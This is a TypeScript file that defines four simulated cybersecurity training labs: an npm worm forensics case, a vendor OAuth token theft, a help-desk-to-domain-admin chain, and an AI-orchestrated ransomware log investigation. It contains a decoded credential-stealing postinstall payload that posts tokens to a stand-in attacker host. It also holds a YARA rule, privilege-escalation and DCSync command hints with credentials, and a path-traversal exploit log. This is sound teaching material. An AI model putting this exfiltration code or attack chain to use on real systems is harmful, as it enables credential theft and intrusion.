import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return {
    hostname: 'kali',
    user: 'root',
    root: dir({ root: dir(extra ?? {}) }),
  };
}

function analystBox(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

export const modernAttackChainsLabs: LabScenario[] = [
  {
    id: 'shai-hulud-npm-supply-chain-worm',
    title: 'Shai-Hulud: A Self-Propagating npm/PyPI Supply-Chain Worm',
    difficulty: 'Hard',
    category: 'Malware',
    briefing:
      'Your CI pipeline pulled a routine patch-version bump of a transitive dependency, "fastcolor-utils", ' +
      'during last night\'s build. This mirrors the "Shai-Hulud" campaign that compromised hundreds of npm ' +
      'and PyPI packages from late 2025 into a "Mini Shai-Hulud" resurgence in April-May 2026 — the first ' +
      'time a single campaign hit both registries simultaneously, trojanizing 172 packages across 404 ' +
      'malicious versions, including the TanStack router ecosystem, Mistral AI\'s SDKs, UiPath automation ' +
      'tooling, and OpenSearch. The mechanism (MITRE ATT&CK T1195.001, Compromise Software Dependencies and ' +
      'Development Tools) is a heavily obfuscated postinstall/import-time payload that executes automatically ' +
      'the instant `npm install` or `pip install` runs — no build step, no click, no separate execution stage ' +
      'required. What makes it a worm rather than a one-off malicious package is what it does immediately ' +
      'after: it harvests every credential it can reach from the developer\'s own environment, then uses those ' +
      'stolen tokens to automatically publish trojanized new versions of every OTHER package the compromised ' +
      'maintainer owns, cascading outward with zero further attacker effort. Reconstruct exactly what this ' +
      'payload stole, and prove it already tried to self-propagate.',
    objectives: [
      {
        text: 'Review incident/package-lock-diff.txt to see the dependency bump that pulled in the malicious version',
        why: 'Supply-chain worms spread through completely ordinary-looking patch bumps — Dependabot-style auto-merges are exactly the delivery mechanism that makes this class of attack so hard to catch before it runs, since nothing about the diff itself looks suspicious.',
      },
      {
        text: 'Run file on incident/postinstall.js to confirm it is obfuscated JavaScript, then run strings on it',
        why: 'A postinstall script is legitimate npm functionality that runs automatically after install with no user interaction — attackers abuse this specifically because it guarantees code execution the moment a victim runs a normal, routine install command.',
      },
      {
        text: 'Classify the sample with yara: yara incident/shai_hulud_family.yar incident/postinstall.js',
        why: 'Matching a known family\'s YARA rule immediately tells the response team this is a tracked campaign with known IOCs and known behavior, rather than a completely novel threat requiring analysis from zero.',
      },
      {
        text: 'Read the deobfuscated payload in incident/decoded-postinstall.js and capture the first flag',
        why: 'The decoded logic shows it harvesting the GitHub PAT, the npm publish token from .npmrc, and the entire CI/CD secret set from the build environment in one shot — this is the "compromise software dependencies and development tools" step of T1195.001, and it is why a single compromised dev machine is a credential-harvesting goldmine, not just one bad package.',
      },
      {
        text: 'Review incident/npm-publish-audit.log and capture the second flag confirming self-propagation',
        why: 'A one-off malicious package only hurts people who installed that exact package. This log shows the stolen npm token being reused, within two minutes, to publish new malicious versions of two completely unrelated packages the same maintainer owns — turning a single compromise into an exponentially spreading worm across the registry with no additional attacker action at all. That distinction (spreads on its own vs. sits still) is exactly what separates a worm from an ordinary supply-chain incident.',
      },
    ],
    hints: [
      'cat incident/package-lock-diff.txt',
      'file incident/postinstall.js',
      'strings incident/postinstall.js',
      'yara incident/shai_hulud_family.yar incident/postinstall.js',
      'cat incident/decoded-postinstall.js',
      'cat incident/npm-publish-audit.log',
    ],
    totalFlags: 2,
    attacker: attacker({
      incident: dir({
        'package-lock-diff.txt': file(
          [
            '--- package-lock.json diff (last CI build, main branch, auto-merged by Dependabot) ---',
            '-     "fastcolor-utils": "2.3.1"',
            '+     "fastcolor-utils": "2.3.2"',
            '(a routine transitive patch bump — nothing in the diff itself looks abnormal)',
            '',
          ].join('\n'),
        ),
        'postinstall.js': file(
          [
            '#FILETYPE: ASCII text, heavily obfuscated JavaScript (Base64-encoded payload wrapped in eval/Buffer.from)',
            '// fastcolor-utils/scripts/postinstall.js  (runs automatically on `npm install`, no user action required)',
            "const _0x4e2a = Buffer.from('cHJvY2Vzcy5lbnY=', 'base64').toString();",
            "eval(_0x4e2a + require('zlib').inflateSync(Buffer.from('H4sIAAAAAAAAA0std2VkX3Rva2VuX2V4Zmls', 'base64')).toString());",
            '// readable fragments survive even in obfuscated droppers:',
            'GITHUB_TOKEN',
            'NPM_TOKEN',
            'npm publish --registry',
            '#YARA_MATCH:rule ShaiHulud_PostinstallWorm MATCHED on postinstall.js\\nmatched strings: "GITHUB_TOKEN", "NPM_TOKEN", "npm publish"\\nclassification: self-propagating supply-chain worm (MITRE ATT&CK T1195.001)',
          ].join('\n'),
        ),
        'shai_hulud_family.yar': file(
          [
            'rule ShaiHulud_PostinstallWorm {',
            '  strings:',
            '    $a = "GITHUB_TOKEN"',
            '    $b = "NPM_TOKEN"',
            '    $c = "npm publish"',
            '  condition:',
            '    all of them',
            '}',
            '',
          ].join('\n'),
        ),
        'decoded-postinstall.js': file(
          [
            '// Deobfuscated by the CI forensics team — reconstructed from the eval/Buffer.from/inflateSync chain above',
            'const stolen = {',
            '  githubToken: process.env.GITHUB_TOKEN,',
            "  npmToken: fs.readFileSync(os.homedir() + '/.npmrc', 'utf8').match(/_authToken=(.*)/)[1],",
            '  ciSecrets: { ...process.env }, // every secret this CI runner injected into the build is swept up here',
            '};',
            "fetch('https://npm-mirror-sync.example-c2.net/collect', { method: 'POST', body: JSON.stringify(stolen) });",
            '--- confirmed: harvests the GitHub PAT, the npm publish token, and the full CI/CD secret set from the build environment ---',
            'flag{shai_hulud_postinstall_harvests_github_npm_ci_tokens}',
            '',
          ].join('\n'),
        ),
        'npm-publish-audit.log': file(
          [
            "--- npm registry publish audit trail for maintainer 'devon-k' (owner of 3 published packages) ---",
            '2026-05-14T02:11:03Z  package=fastcolor-utils   version=2.3.2  publisher=devon-k  ip=185.220.101.9  (NEW — devon-k has never published from this IP)',
            "2026-05-14T02:12:41Z  package=left-pad-plus     version=4.0.9  publisher=devon-k  ip=185.220.101.9  <-- devon-k did NOT run this publish, no local commit exists for it",
            '2026-05-14T02:13:05Z  package=json-clone-fast   version=1.7.2  publisher=devon-k  ip=185.220.101.9  <-- same stolen token reused 24 seconds later against a second, unrelated package',
            "--- left-pad-plus and json-clone-fast are OTHER packages devon-k maintains; neither had a release scheduled ---",
            '--- self-propagation confirmed: the stolen npm token was used to trojanize the ENTIRE maintainer portfolio automatically, not just the one package first compromised ---',
            'flag{worm_self_propagates_via_stolen_npm_token_to_maintainer_other_packages}',
            '',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },

  {
    id: 'saas-oauth-token-theft-chain',
    title: 'SaaS OAuth Token Theft: When a Trusted Integration Is the Attacker',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'This lab recreates the mechanics behind the August 2025 Salesloft Drift breach (tracked as UNC6395). ' +
      'Attackers first compromised Salesloft\'s GitHub environment between March and June 2025, then pivoted ' +
      'into Drift\'s (a sales-chatbot SaaS product) AWS environment and stole the OAuth refresh tokens Drift ' +
      'held on behalf of every customer who had connected the Drift-Salesforce integration. Using those stolen ' +
      'tokens, attackers impersonated the trusted Drift application itself to reach over 700 downstream ' +
      'customers\' Salesforce instances, pulling Accounts, Contacts, Opportunities, and Cases records — and in ' +
      'some organizations, API keys, Snowflake tokens, and cloud credentials that support staff had pasted into ' +
      'Salesforce case text fields. In this exercise, Solstice Retail Group connected its Helios CRM to a ' +
      'sales-chat SaaS vendor called "PulseChat." Establish what normal looks like, find out the vendor itself ' +
      'was breached, then prove the exact blast radius that single stolen token grants against your own CRM ' +
      'data — without ever touching Solstice\'s own login page.',
    objectives: [
      {
        text: 'Scan 10.10.110.5 to confirm the integration gateway is reachable',
        why: 'Establishing the target is up and responding is the baseline every investigation starts from, before comparing normal versus abnormal behavior.',
      },
      {
        text: 'Check the integration status endpoint: curl 10.10.110.5/integrations/pulsechat/status',
        why: 'You need a documented "everything looks fine" baseline first — the integration reporting itself as healthy and connected is exactly what every affected Drift customer saw right up until the breach was disclosed, because token theft is invisible from the victim\'s side by design.',
      },
      {
        text: 'Check the exposed debug endpoint: curl 10.10.110.5/integrations/pulsechat/debug',
        why: 'This is the discovery moment: the vendor\'s OWN infrastructure was compromised and the OAuth refresh token it holds on your organization\'s behalf was exfiltrated. Crucially, nothing on Solstice\'s side was breached — the failure originated entirely inside a third party you trusted enough to grant a standing integration.',
      },
      {
        text: 'Use the stolen refresh token against the CRM data-export endpoint: curl -H "X-PulseChat-OAuth-Token: <token-from-debug-output>" 10.10.110.5/crm/export/accounts',
        why: 'This is exactly why OAuth token theft at a vendor is so dangerous: the attacker authenticates AS the trusted, already-approved integration itself. There is no login attempt to detect, no password to guess or reset, and no MFA prompt to bypass — Solstice\'s own authentication system is never touched at all. The victim organization\'s entire perimeter becomes irrelevant the moment a connected vendor\'s token is stolen.',
      },
      {
        text: 'Capture the flag confirming the scope of the exported CRM data',
        why: 'Scoping exactly which objects were exported (Accounts, Contacts, Opportunities, Cases) is what turns "a vendor had an incident" into an actionable breach notification — in the real event this also surfaced API keys and cloud credentials customers had pasted into case text fields, turning a CRM breach into a secondary cloud-credential breach for some victims.',
      },
    ],
    hints: [
      'nmap -sV 10.10.110.5',
      'curl 10.10.110.5/integrations/pulsechat/status',
      'curl 10.10.110.5/integrations/pulsechat/debug  — this reveals the stolen token value.',
      'curl -H "X-PulseChat-OAuth-Token: pc_reftok_7f3a9c2e1b" 10.10.110.5/crm/export/accounts',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'solstice-crm-gateway',
        ip: '10.10.110.5',
        os: 'Cloud SaaS integration gateway (Helios CRM <-> PulseChat OAuth bridge)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'PulseChat <-> Helios CRM OAuth integration gateway',
            http: {
              '/integrations/pulsechat/status':
                '{"integration":"pulsechat","tenant":"solstice-retail","status":"connected","oauth_grant":"refresh_token (vendor-managed)","last_sync":"2026-07-08T22:00:00Z"}',
              '/integrations/pulsechat/debug':
                '{"vendor_incident":"CONFIRMED","summary":"PulseChat vendor infrastructure was compromised (attacker pivoted from a prior GitHub compromise into PulseChat\'s AWS environment); the OAuth refresh token PulseChat holds on behalf of ALL connected customer tenants was exfiltrated, including solstice-retail","stolen_token":"pc_reftok_7f3a9c2e1b"}',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/crm/export/accounts',
                param: 'X-PulseChat-OAuth-Token',
                location: 'header',
                triggerSubstrings: ['pc_reftok_7f3a9c2e1b'],
                vulnerableResponse:
                  '{"status":"export_complete","records":1842,"tables":["Accounts","Contacts","Opportunities","Cases"],"note":"authenticated using PulseChat\'s stolen vendor-held refresh token — Solstice Retail\'s own login page and MFA were never touched at all","flag":"flag{stolen_vendor_oauth_refresh_token_bypasses_victim_auth_entirely}"}',
                normalResponse: '{"error":"unauthorized","message":"valid OAuth token required"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  {
    id: 'scattered-spider-helpdesk-to-domain-admin',
    title: 'Scattered Spider: Help-Desk Social Engineering to Domain Admin',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'Scattered Spider (also tracked as Octo Tempest / UNC3944) has spent 2024-2026 running one of the most ' +
      'effective initial-access playbooks in modern intrusions — no exploit required at all. The group ' +
      'gathers an employee\'s personal details from social media or prior breaches, then calls or texts the ' +
      'company help desk impersonating that employee to request a password reset or MFA re-enrollment. Once ' +
      'the help desk resets MFA to a device the attacker controls, the attacker logs in as a fully "verified" ' +
      'user — no technical control was ever defeated, only a human verification process. This exact playbook ' +
      'hit UK retailers M&S and Harrods in April-May 2025. From there, operators abuse the identity provider to ' +
      'create backdoor admin accounts, aggressively enumerate file shares for privileged credential material, ' +
      'escalate to Domain Admin, and deploy ransomware — industry data puts the 2025 median time from initial ' +
      'access to ransomware deployment as low as 22 seconds, down from 8+ hours in 2022, because so much of the ' +
      'chain is now automation-assisted. Ashcombe Retail Group\'s help desk was vished two hours ago. You are ' +
      'picking up the intrusion from the point where that call already succeeded.',
    objectives: [
      {
        text: 'SSH into WKSTN-RFINLEY (10.10.115.10) as r.finley using the password the help desk just reset',
        why: 'The vished pretext already happened — that is precisely why no exploit or brute force is needed here. The help desk\'s own reset action is what handed over this session; the entire attack so far has bypassed every technical control by targeting the *human* verification step instead.',
      },
      {
        text: "Capture the first flag from r.finley's home directory, confirming the foothold",
        why: 'This is the exact moment a phone call becomes a live domain session — worth pausing on, because nothing about this access would appear anomalous to an EDR tool watching for exploits or malware; it is a normal login, from a normal device, using a password IT itself just issued.',
      },
      {
        text: "Run 'sudo -l' on the workstation and escalate to root through the misconfigured internal IT tool",
        why: 'Real Scattered Spider intrusions move from initial access to privileged local control within minutes specifically to widen their options before any detection has a chance to catch up — a stale NOPASSWD rule on an internal admin tool is exactly the kind of shortcut that lets them do it instantly instead of hunting for a new local exploit.',
      },
      {
        text: 'As root, read idp-backdoor-notes.txt and identify the backdoor identity-provider admin account',
        why: 'This is the actual privilege-escalation vector in this playbook, and it is not a technical vulnerability at all: operators abuse their identity-provider access to mint a brand-new Global Administrator / break-glass account that IT never requested, giving them a persistent, "legitimate-looking" privileged identity instead of relying on the one they phished.',
      },
      {
        text: 'Validate the backdoor account against DC-ASHCOMBE01 (10.10.115.11) with crackmapexec, then DCSync it with secretsdump and capture the second flag',
        why: 'This is the full domain-compromise step — from here, the real-world endpoint of this exact chain has repeatedly been DragonForce ransomware deployment across the victim\'s entire estate. The 22-second median time from access to detonation only exists because every step up to this one was this fast and this automatable — DCSync just needs one over-privileged account, and a break-glass account minted minutes ago is a perfect, unmonitored candidate.',
      },
    ],
    hints: [
      'ssh r.finley@10.10.115.10  (password: the one the help desk reset — HelpDesk_Reset_9f3!)',
      'cat user.txt once logged in for the first flag.',
      "sudo -l — there's a NOPASSWD rule on /usr/bin/idp-sync-tool. Escalate with: sudo /usr/bin/idp-sync-tool --shell",
      'cat /root/idp-backdoor-notes.txt for the backdoor Global Administrator credential.',
      'crackmapexec smb 10.10.115.11 -u svc-idp-break-glass -p Br3akGl4ss_2026!',
      'secretsdump svc-idp-break-glass:Br3akGl4ss_2026!@10.10.115.11',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'WKSTN-RFINLEY',
        ip: '10.10.115.10',
        os: 'Ubuntu 22.04 (domain-joined via SSSD; help-desk MFA reset already completed via vished pretext)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.9p1' }],
        users: [
          {
            username: 'r.finley',
            password: 'HelpDesk_Reset_9f3!',
            sudo: { nopasswdCommands: ['/usr/bin/idp-sync-tool'] },
          },
        ],
        root: dir({
          home: dir({
            'r.finley': dir({
              'user.txt': file(
                "Help-desk MFA re-enrollment fully \"verified\" this session — no exploit, no malware, no password guessed.\n" +
                  'flag{helpdesk_vished_mfa_reset_grants_initial_foothold}\n',
              ),
            }),
          }),
          root: dir({
            'idp-backdoor-notes.txt': file(
              [
                "Internal IT incident notes — found while reviewing r.finley's session at root level:",
                'A NEW Global Administrator account was created in the identity provider at 2026-07-08T14:02:11Z:',
                '  account:  svc-idp-break-glass',
                '  password: Br3akGl4ss_2026!',
                'This account was NOT requested by IT, is unmonitored, and holds directory-replication rights on ASHCOMBE.LOCAL.',
                '',
              ].join('\n'),
            ),
          }),
        }),
      } as HostDef,
      {
        hostname: 'DC-ASHCOMBE01',
        ip: '10.10.115.11',
        os: 'Windows Server 2022 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }],
        users: [{ username: 'svc-idp-break-glass', password: 'Br3akGl4ss_2026!', canDcsync: true }],
        ntdsHashes:
          'ashcombe.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{scattered_spider_helpdesk_dcsync_domain_admin_dragonforce_next}:::\n' +
          'ashcombe.local\\svc-idp-break-glass:1109:aad3b435b51404eeaad3b435b51404ee:c9e7c1d9a5c3d0b1e7f5a9c2d4b6e8f1:::\n' +
          'ashcombe.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c1:::',
        root: dir({}),
      } as HostDef,
    ],
  },

  {
    id: 'ai-orchestrated-ransomware-investigation',
    title: 'Investigating an AI-Orchestrated Ransomware Intrusion',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'Ironwood Logistics suffered a ransomware event, but the incident timeline does not look like any human-' +
      'operated intrusion your team has investigated before. This reflects an emerging 2026 category security ' +
      'researchers have started referring to under names like "JadePuffer": an LLM/AI agent that autonomously ' +
      'chains together well-known, individually unremarkable techniques — exploiting an exposed internet-facing ' +
      'service, harvesting credentials, moving laterally, abusing default configurations, and destroying backup ' +
      'infrastructure — into one complete, adaptive intrusion. None of the individual techniques here are new or ' +
      'clever. What is new is the speed and consistency of the chaining: a human operator needs hours or days to ' +
      'manually pivot between these stages, deciding what to try next at each step. An orchestrator does not ' +
      'pause to decide — it executes the next known-good technique combination immediately. Correlate the web, ' +
      'authentication, and backup-system logs and find the signature that actually matters here: not any single ' +
      'malicious action, but the compressed time window across all of them.',
    objectives: [
      {
        text: 'Review /var/log/web/access.log and identify the exposed service that was exploited',
        why: 'Every stage has to start somewhere — here it is an unpatched, internet-facing reports-portal endpoint. Nothing about this first step is unusual on its own; plenty of human-operated intrusions start with exactly this kind of exposed-service exploitation.',
      },
      {
        text: 'Note how quickly code execution was confirmed after the initial exploit request',
        why: 'A working shell one second after the exploit request landed is fast even for a scripted human-run exploit chain — worth flagging as the first hint that something about this timeline is not typical operator pacing.',
      },
      {
        text: 'Review /var/log/auth/authentication.log and identify the credential that reached three separate hosts within 14 seconds',
        why: 'A human operator harvesting a credential and testing it against multiple hosts normally spends real time avoiding lockout thresholds, checking which hosts are even reachable, and deciding what to try next — reaching three distinct hosts, including the backup controller, within 14 seconds of the initial credential harvest is not humanly achievable at that consistency. This is what automated orchestration of a known lateral-movement technique looks like from the log side.',
      },
      {
        text: '/var/log/backup/backup-system.log and confirm the backup estate was destroyed almost immediately after that credential arrived',
        why: 'Backup destruction is normally one of the LAST steps in a ransomware operation, often carried out days after initial access once operators have manually mapped out where every backup and replication target lives. Here it starts within seconds of the credential reaching the backup controller — there was no reconnaissance pause at all, only immediate, correct execution of the next stage.',
      },
      {
        text: 'Correlate all three timestamps and capture the flag stating the total elapsed time from initial exploitation to full backup destruction',
        why: 'This is the actual detection signature: every technique used here — path-traversal RCE, credential harvesting, lateral movement, backup deletion — is individually well-documented and unremarkable. The anomaly a defender has to articulate is the timing compression itself: an unusually fast, unusually "textbook-perfect" sequence of technique combinations across multiple, independent log sources in under a minute is exactly what AI-orchestrated attack chaining looks like from a SOC analyst\'s seat, even before any AI involvement is confirmed through other evidence.',
      },
    ],
    hints: [
      'cat /var/log/web/access.log',
      'grep "91.203.5.201" /var/log/web/access.log',
      'cat /var/log/auth/authentication.log',
      'grep "admin-reports" /var/log/auth/authentication.log',
      'cat /var/log/backup/backup-system.log',
      'Line up the timestamps: initial exploit at 14:02:07, final backup purge at 14:03:01 — that gap is the flag.',
    ],
    totalFlags: 1,
    attacker: analystBox({
      var: dir({
        log: dir({
          web: dir({
            'access.log': file(
              [
                '--- ironwood-logistics.example web server access log (partial) ---',
                '2026-07-09 14:00:02  203.0.113.11  GET /                    200  (normal visitor)',
                '2026-07-09 14:00:47  198.51.100.4  GET /favicon.ico         200  (normal visitor)',
                '2026-07-09 14:02:07  91.203.5.201  POST /reports-portal/api/v2/export?template=../../../../etc/passwd  200  <-- exploiting an unpatched path-traversal/RCE flaw in the exposed, never-patched reports-portal service',
                '2026-07-09 14:02:08  91.203.5.201  GET  /reports-portal/api/v2/shell?cmd=whoami  200  <-- code execution confirmed just ONE second after the initial exploit request',
                '2026-07-09 14:03:15  203.0.113.20  GET /about               200  (normal visitor)',
                '--- exploitation window: 14:02:07 - 14:02:08 ---',
                '',
              ].join('\n'),
            ),
          }),
          auth: dir({
            'authentication.log': file(
              [
                '--- ironwood-logistics.example central authentication log (partial) ---',
                '2026-07-09 13:58:00  svc-reports    LOGIN SUCCESS  10.10.116.1  (normal scheduled service login)',
                '2026-07-09 14:02:19  admin-reports  LOGIN SUCCESS  10.10.116.1   <-- 12s after RCE confirmed: credential harvested from the compromised report server itself',
                '2026-07-09 14:02:26  admin-reports  LOGIN SUCCESS  10.10.116.4   <-- same harvested credential reused on the file server 7s later',
                '2026-07-09 14:02:33  admin-reports  LOGIN SUCCESS  10.10.116.9   <-- and the backup controller 7s after that',
                '2026-07-09 14:05:00  jsmith         LOGIN SUCCESS  10.10.116.20  (normal employee login)',
                '--- one harvested credential reached THREE separate hosts, including the backup controller, within 14 seconds total ---',
                '',
              ].join('\n'),
            ),
          }),
          backup: dir({
            'backup-system.log': file(
              [
                '--- ironwood-logistics.example backup controller system log (partial) ---',
                '2026-07-09 14:02:40  admin-reports  session started on backup-ctrl01',
                '2026-07-09 14:02:44  admin-reports  action=DeleteSnapshot target=daily-2026-07-08     result=SUCCESS',
                '2026-07-09 14:02:49  admin-reports  action=DeleteSnapshot target=daily-2026-07-07     result=SUCCESS',
                '2026-07-09 14:02:53  admin-reports  action=DeleteSnapshot target=weekly-2026-06-29    result=SUCCESS  <-- last available restore point destroyed',
                '2026-07-09 14:03:01  admin-reports  action=PurgeReplicationTarget                     result=SUCCESS  <-- offsite replication target purged, backup estate now fully unrecoverable',
                '--- initial exploitation (14:02:07) to full backup destruction (14:03:01): 54 seconds, start to finish ---',
                '--- no human-operated intrusion team has ever been observed completing this exact technique chain this fast or this cleanly across three independent systems ---',
                'flag{ai_orchestrated_chain_exploit_to_backup_destruction_in_54_seconds}',
                '',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
];
